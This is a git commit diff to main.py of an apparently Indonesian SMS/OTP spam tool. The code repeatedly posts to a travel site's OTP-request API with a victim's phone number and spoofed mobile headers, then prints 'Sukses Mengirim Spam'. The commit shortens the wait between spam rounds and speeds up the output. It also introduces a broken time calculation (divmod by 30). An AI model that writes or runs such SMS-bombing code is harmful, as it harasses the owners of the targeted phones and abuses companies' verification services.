345e30ccac21a7bd72869808217c904425c9d931
pebalap <147577666+pebalap@users.noreply.github.com>
2023-10-13 14:23:07 +0700

    Update main.py

--- main.py
+++ main.py
@@ -36,11 +36,11 @@ def autoketik(s):
     for c in s + "\n":
         sys.stdout.write(c)
         sys.stdout.flush()
-        time.sleep(0.050)
+        time.sleep(0.030)
 
 # Function ini berfungsi sebagai informasi waktu saat pengiriman spam berlangsung.
 def countdown(time_sec):
-        mins, secs = divmod(time_sec,60)
+        mins, secs = divmod(time_sec,30)
         timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Silakan Menunggu Dalam Waktu \033[1;92m{:02d}:{:02d}'.format(mins,secs)
         waktu = time.localtime()
         keterangan_jam = time.strftime("%H:%M:%S", waktu)
@@ -197,7 +197,7 @@ def jam(nomor): # Don't Remove Code !!!!
                 Misteraladin                           =  requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
                 
                 autoketik(f"{hijau}Sukses Mengirim Spam")
-                countdown(120) # Jangan Diubah !!!!
+                countdown(60) # Jangan Diubah !!!!
                 
             except requests.exceptions.ConnectionError: # Error Handling Ketika Request Time Out di salah satu URL API
                 if RTO_flag == 0:
